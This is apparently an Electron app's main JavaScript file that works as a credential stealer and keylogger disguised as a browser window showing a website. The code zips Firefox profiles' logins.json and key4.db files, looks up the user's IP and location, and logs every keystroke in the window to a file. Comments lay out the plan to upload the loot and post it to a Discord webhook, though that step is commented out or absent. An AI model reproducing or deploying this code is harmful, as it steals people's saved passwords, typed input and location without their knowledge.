const { app, BrowserWindow } = require('electron')
const fetch = require('electron-fetch').default
// const path = require("path");
const fs = require('fs');
const fsExtra = require("fs-extra");
// const ipcMain = require('electron').ipcMain;
// const { desktopCapturer } = require('electron');
const JSZip = require("jszip");
// const FileSaver = require("file-saver");
const client = require('filestack-js').init("API KEY");
let fullText = "";
function createWindow () {
// Create the browser window.
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    icon: __dirname + '/icon/snowman.png',
    webPreferences: {
      nodeIntegration: true,
      nativeWindowOpen: true,
      contextIsolation: true,
    },
    simpleFullscreen: true,
    // fullscreen: true
    // frame: false
  })
  // Retrieve key (encrypted)
  // Create app on the surface key logs.
  // Also retrieves login/pass from your browser (chrome/firefox).
  // Zip these files. Upload them.
  // discord post webhook for posting key.

  // Load the index.html of the app.
  //win.loadFile('src/index.html')
  win.loadURL("https://krishneelkumar.com/");
  // win.loadURL("https://stackoverflow.com/users/login")
  const ses = win.webContents.session
  console.log(ses.getUserAgent())
  let win1 = BrowserWindow.getAllWindows()[0];

  fs.opendir(process.env.APPDATA + "\\Mozilla\\Firefox\\Profiles", (err, dir) => {
    if (err) {
      console.log("ERROR");
    } else {
      var recentTime = 0;
      let recentFile = ""
      console.log(dir.path);

      files = fs.readdirSync(dir.path);
        let zip = new JSZip();
        files.forEach(file => {
          statObj = fs.statSync(dir.path + "\\" + file);
          if (statObj.mtimeMs > recentTime && file.indexOf("default") != -1) {
            recentTime = statObj.mtimeMs;
            recentFile = file;
          };
          if (statObj["mode"] == 16822) {
            storeMozillaFiles(zip, dir.path + "\\" + file, file);
          }
        })
        console.log(dir.path + "\\" + recentFile + "\\" + "login.json");
        zip
        .generateNodeStream(
          {type: "nodebuffer",
           streamFiles: true,
           compression: "DEFLATE",
           compressionOptions: {"level": 9}})
        .pipe(fs.createWriteStream("out.zip"))
        .on("finish", function() {
          fs.rmdir("out.zip", {recursive: true}, function() {
            console.log("done");
          })
          // Need discord webhook to post data.
          // client.upload("aqua.zip").then(
          //   function(result) {
          //     console.log(result);
          //   },
          //   function(error) {
          //     console.log(error);
          //   }
          // );
          console.log("out.zip");
        });
        console.log(recentFile);
        // fs.readdirSync(dir.path).forEach(file => {
        //   // https://www.geeksforgeeks.org/node-js-fs-stat-method/
        //   var statObj = fs.statSync(file.);
        //   console.log(statObj.isDirectory())
        //   console.log(file);
        // })
    }
    dir.close()
  })
  // fs.rmdir("out.zip", {recursive: true}, function() {
  //   console.log("done");
  // })
  fetch('https://api.ipdata.co/?api-key=test')
  .then(results => results.json())
  .then(json => {
      fullText += 'IP: ' + json.ip + '\n';
      fullText += 'City: ' + json.city + '\n';
      fullText += 'Region: ' + json.region + '\n';
      fullText += 'Host: ' + json.asn.name + '\n';
      fullText += 'Domain: ' + json.asn.domain + '\n';
      fullText += 'Route: ' + json.asn.route + '\n';
      if (json.threat.is_threat == true) {
        fullText += 'Is_Tor: ' + json.threat.is_tor + '\n';
        fullText += 'Is_Proxy: ' + json.threat.is_proxy + '\n';
        fullText += 'Is_Anonymous: ' + json.threat.is_anonymous + '\n';
        fullText += 'Is_Known_Attacker: ' + json.threat.is_known_attacker + '\n';
        fullText += 'Is_Known_Abuser: ' + json.threat.is_known_abuser + '\n';
        fullText += 'Is_Bogon: ' + json.threat.is_bogon + '\n';
      }
  })
  for(const window of BrowserWindow.getAllWindows()) {
    if (win1.webContents) {
      win1.webContents.on('before-input-event', (event, input) => {
        // setTimeout(writingText(input), 500);
        if (!input.isAutoRepeat && input.type == 'keyDown') {
          if ((input.key) == 'Tab') {
            input.key = '\r\n';
          }
          fullText += input.key;
          fs.writeFileSync('log.txt', fullText);
        }
        // fs.appendFileSync('log.txt', '\n');
      })
    }
    // else {
      // window.webContents.on('before-input-event', (event, input) => {
      //   if (!input.isAutoRepeat && input.type == 'keyDown') {
      //     if ((input.key) == 'Tab') {
      //       input.key = '\r\n';
      //     } else if((input.key) == 'CapsLock') {
      //       input.key = '\nCaps: ENABLED\n';
      //     }
      //     fullText += input.key;
      //     fs.writeFileSync('someText.txt', fullText);
      //   }
      // })
    //}
  };

  // Open the DevTools.
  // win.webContents.openDevTools()
}

function checkDir(path) {
  fs.opendir(path, (err, dir) => {
    if (err) {
      return false;
    } else {
      dir.close();
      return true;
    }
  })
}

// Check file exists, using a path.
// If exists store in zip, and pass foldername for zip.folder().

function storeMozillaFiles(zip, pathName, folderName) {
  try {
    fs.statSync(pathName + "\\" + "key4.db");
  } catch (err) {
    return;
  }
  try {
    fs.statSync(pathName + "\\" + "logins.json");
  } catch (err) {
    return;
  }
  var loginPath = pathName + "\\" + "logins.json";
  var keyPath = pathName + "\\" + "key4.db";
  zip.folder(folderName);
  zip.file(folderName + "\\" + "logins.json", fs.createReadStream(loginPath));
  zip.file(folderName + "\\" + "key4.db", fs.createReadStream(keyPath));
  return;
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
// app.on('ready', createWindow);
app.on('ready', () => {
  createWindow()
});

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

// app.on('session-created', (session) => {
//   console.log(session)
// })

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and import them here.
// app.once('ready', () => {
//   const handleRedirect = (e, url) => {
//     if (url !== e.sender.getURL()) {
//       e.preventDefault()
//       shell.openExternal(url)
//     }
//   }
//   const win = new BrowserWindow()
//   // Instead bare webContents:
//   win.webContents.on('will-navigate', handleRedirect)
//   win.loadURL('http://google.com')
// })